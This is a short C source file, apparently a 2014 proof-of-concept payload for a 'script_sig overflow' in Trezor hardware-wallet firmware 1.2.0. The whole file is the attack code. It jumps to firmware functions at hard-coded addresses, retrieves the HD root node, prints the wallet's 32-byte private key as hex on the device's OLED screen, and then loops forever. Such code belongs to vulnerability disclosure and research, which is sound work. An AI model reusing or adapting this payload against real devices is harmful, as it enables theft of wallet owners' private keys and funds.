/*
	Trezor 1.2.0 script_sig overflow
	MIT license
	Nicolas Bacca, BTChip, 2014
*/

#include "layout.h"
#include "oled.h"
#include "debug.h"
#include "storage.h"

typedef bool (*tgetRootNode)(HDNode* node);
typedef void (*toledClear)(void);
typedef void (*toledDrawString)(int x, int y, const char* text);
typedef void (*toledRefresh)(void);

void hax(void);

void hax() {
        HDNode node;
        char tmp[20];
        char hexdigits[16];
        int i;
        int j;
	tgetRootNode myGetRootNode;
	toledClear myOledClear;
	toledDrawString myOledDrawString;
	toledRefresh myOledRefresh;

	myGetRootNode = (tgetRootNode)0x08010a39;
	myOledClear = (toledClear)0x0801c679;
	myOledDrawString = (toledDrawString)0x0801c83d;
	myOledRefresh = (toledRefresh)0x0801c689;
	

        hexdigits[0] = '0'; hexdigits[8] = '8';
        hexdigits[1] = '1'; hexdigits[9] = '9';
        hexdigits[2] = '2'; hexdigits[10] = 'A';
        hexdigits[3] = '3'; hexdigits[11] = 'B';
        hexdigits[4] = '4'; hexdigits[12] = 'C';
        hexdigits[5] = '5'; hexdigits[13] = 'D';
        hexdigits[6] = '6'; hexdigits[14] = 'E';
        hexdigits[7] = '7'; hexdigits[15] = 'F';
        myGetRootNode(&node);

        myOledClear();
        for (i=0; i<4; i++) {
                for (j=0; j<8; j++) {
                        uint8_t x = node.private_key[8 * i + j];
                        tmp[2 * j] = hexdigits[(x >> 4) & 0x0f];
                        tmp[2 * j + 1] = hexdigits[x & 0x0f];
                }
                tmp[16] = '\0';
                myOledDrawString(0, i * 8, tmp);
        }
        myOledRefresh();
	for(;;);
}

